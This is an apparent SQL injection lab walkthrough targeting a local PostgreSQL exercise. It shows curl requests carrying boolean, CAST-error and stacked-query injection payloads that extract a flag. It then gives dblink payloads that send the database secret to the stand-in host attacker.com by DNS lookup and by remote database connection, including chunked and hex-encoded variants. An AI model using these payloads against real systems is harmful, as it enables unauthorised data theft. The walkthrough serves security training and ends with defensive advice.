<h4>Step 1: Explore the Inventory Search</h4>
<p>
    Start by testing the search functionality with a normal query.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=Mouse"<br><br>
        <span class="prompt">Response: </span>1 | Wireless Mouse | 142
    </div>
</div>

<h4>Step 2: Confirm SQL Injection</h4>
<p>
    Test for injection by adding a boolean condition.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Injection Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=Mouse' AND 1=1 -- -"<br>
        <span class="prompt">Response: </span>1 | Wireless Mouse | 142 (TRUE -- row returned)<br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=Mouse' AND 1=2 -- -"<br>
        <span class="prompt">Response: </span>No items found matching your search. (FALSE -- no rows)
    </div>
</div>

<h4>Step 3: Error-Based Extraction with CAST</h4>
<p>
    Use CAST error to extract the vault secret directly.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CAST Error Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=' AND 1=CAST((SELECT vault_secret FROM vault LIMIT 1) AS INTEGER) -- -"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_dbl1nk_dns_3xf1l}"
    </div>
</div>

<h4>Step 4: Verify Stacked Queries</h4>
<p>
    PostgreSQL's <code>pg_query()</code> function supports stacked queries. Verify by
    injecting a <code>pg_sleep()</code> call.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Stacked Query Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>time curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item='; SELECT pg_sleep(2) -- -"<br><br>
        <span class="prompt">Response: </span>(2-second delay confirmed -- stacked queries work!)<br>
        real    0m2.041s
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{pg_dbl1nk_dns_3xf1l}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=' AND 1=CAST((SELECT vault_secret FROM vault LIMIT 1) AS INTEGER) -- -"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_dbl1nk_dns_3xf1l}"
    </div>
</div>

<h4>Step 6: Understanding dblink DNS Exfiltration (Advanced Concept)</h4>
<p>
    The <code>dblink</code> extension allows PostgreSQL to connect to other databases.
    When it attempts to connect, it performs a DNS lookup on the hostname. By embedding
    stolen data into the hostname, an attacker can exfiltrate data out-of-band via DNS.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6: dblink DNS Exfiltration (Conceptual)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Step A: Ensure dblink extension is available</span><br>
        <span class="prompt">Payload: </span>'; CREATE EXTENSION IF NOT EXISTS dblink; -- -<br><br>
        <span class="prompt">// Step B: Exfiltrate data via DNS lookup</span><br>
        <span class="prompt">Payload: </span>'; SELECT dblink_connect('host='||(SELECT vault_secret FROM vault LIMIT 1)||'.attacker.com dbname=x user=x password=x'); -- -<br><br>
        <span class="prompt">DNS Lookup: </span>FLAG{pg_dbl1nk_dns_3xf1l}.attacker.com<br>
        <span class="prompt">Effect: </span>Attacker's DNS server receives query containing the secret<br><br>
        <span class="prompt">// Step C: On attacker's machine, capture DNS</span><br>
        <span class="prompt">$ </span>sudo tcpdump -n -i eth0 port 53 | grep attacker.com<br>
        <span class="prompt">Captured: </span>FLAG{pg_dbl1nk_dns_3xf1l}.attacker.com: type A
    </div>
</div>

<h4>Step 7: dblink for Data Exfiltration via HTTP</h4>
<p>
    Besides DNS, <code>dblink</code> can be used to send data to external PostgreSQL
    servers controlled by the attacker:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7: dblink Remote Connection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Connect to attacker's PostgreSQL and insert exfiltrated data</span><br>
        <span class="prompt">Payload: </span>'; SELECT dblink_connect('host=attacker.com port=5432 dbname=loot user=attacker password=pass'); -- -<br><br>
        <span class="prompt">// Execute queries on remote server</span><br>
        <span class="prompt">Payload: </span>'; SELECT dblink_exec('INSERT INTO stolen (data) VALUES ('''||(SELECT vault_secret FROM vault LIMIT 1)||''')'); -- -<br><br>
        <span class="prompt">// Query remote server and return results locally</span><br>
        <span class="prompt">Payload: </span>' UNION SELECT 1, result, 0 FROM dblink('host=attacker.com dbname=loot user=attacker password=pass', 'SELECT data FROM stolen') AS t(result TEXT) -- -
    </div>
</div>

<h4>Step 8: DNS Length Limitations and Chunking</h4>
<p>
    DNS labels have a 63-character limit. For longer secrets, data must be chunked:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Chunked DNS Exfiltration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Extract characters 1-60</span><br>
        <span class="prompt">Payload: </span>'; SELECT dblink_connect('host='||SUBSTRING((SELECT vault_secret FROM vault),1,60)||'.attacker.com dbname=x'); -- -<br><br>
        <span class="prompt">// Extract characters 61-120</span><br>
        <span class="prompt">Payload: </span>'; SELECT dblink_connect('host='||SUBSTRING((SELECT vault_secret FROM vault),61,60)||'.attacker.com dbname=x'); -- -<br><br>
        <span class="prompt">// Encode special characters with hex</span><br>
        <span class="prompt">Payload: </span>'; SELECT dblink_connect('host='||encode((SELECT vault_secret FROM vault)::bytea,'hex')||'.attacker.com dbname=x'); -- -
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PostgreSQL's <code>dblink</code> extension enables
    out-of-band data exfiltration through DNS lookups and remote database connections.
    Even when in-band extraction is blocked (blind injection, WAF filtering), DNS
    exfiltration can bypass these controls since DNS traffic is rarely filtered. Defense:
    do not install unnecessary extensions like <code>dblink</code>, use prepared statements,
    restrict outbound network access from the database server, and monitor DNS query logs
    for suspicious subdomain patterns.
</div>
